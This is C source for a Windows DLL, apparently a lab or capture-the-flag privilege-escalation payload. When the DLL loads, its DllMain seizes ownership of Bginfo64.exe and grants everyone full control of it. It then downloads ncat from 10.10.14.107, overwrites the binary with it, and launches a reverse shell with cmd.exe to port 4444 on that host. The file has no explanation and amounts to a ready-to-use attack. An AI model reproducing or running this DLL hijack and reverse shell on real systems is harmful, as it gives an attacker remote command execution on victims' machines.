# include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
  switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
      system("takeown /f C:\\share\\Bginfo64.exe");
      system("icacls C:\\share\\Bginfo64.exe /grant Everyone:F /T");
      system("curl.exe 10.10.14.107:8888/ncat.exe -o c:\\share\\Bginfo64.exe");
      system("C:\\share\\Bginfo64.exe 10.10.14.107 4444 -e cmd.exe");
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
